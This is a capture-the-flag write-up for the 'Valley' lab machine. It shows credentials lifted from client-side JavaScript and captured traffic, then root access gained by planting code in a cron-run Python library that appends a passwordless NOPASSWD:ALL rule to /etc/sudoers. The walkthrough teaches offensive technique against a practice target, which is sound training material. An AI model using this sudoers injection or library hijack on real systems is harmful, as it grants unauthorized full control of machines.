# Valley

We got a website on http://valley.thm port 80<br>
![valley.thm](./imgs/valley.thm.png)<br>
<hr>
Here is some usernames that found during my research:<br>
- valleyDev<br>
- siemDev<br>
<hr>

http://valley.thm/pricing/note.txt
```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```
So we know that there is a page */dev1243224123123* and also we know that there is a *siem*, and maybe we will be able to find in the siem logs.<hr>

**Research of http://valley.thm/dev1243224123123**<br>
I viewed the source code and found this piece of code in one of the js files.
```
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```

It gives us:<br>
- Credentials: `siemDev:california`
- Page: http://valley.thm/dev1243224123123/devNotes37370.txt
<hr>

http://valley.thm/dev1243224123123/devNotes37370.txt<br>
```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```
- someone reuses creds on ftp server.
- FTP is enable, but on different port.

nmap found `FTP` for me on port = **37370/tcp**
<hr>

We have siem files on the ftp server. I started researching them and found this line there:<br>
```
uname=valleyDev&psw=ph0t0s1234&remember=onHTTP/1.1 200 OK
```
which gives us new creds:<br>
- `valleyDev:ph0t0s1234`

I made a successful connection via `ssh` with those creds and started looking for privilege escalation method.
<hr>

# Privilege Escalation
- `whoami` - `valleyDev`
- A script running in `crontab`
- The script uses `base64` library
- Group `valleyAdmin` can edit `base64.py`
- User: `valley` in the group
- `/home/valleyAuthenticator`
- `upx -d valleyAuthenticator`
- Found hashes in `strings`
- `valley:liberty123`

Than I started editing `base64.py` and added there this code:
```
import os

os.system('echo "valley ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')
```
This code gives the user valley absolute sudo privileges with no password. Wait until the script runs again and now valley is super user.
`sudo su`.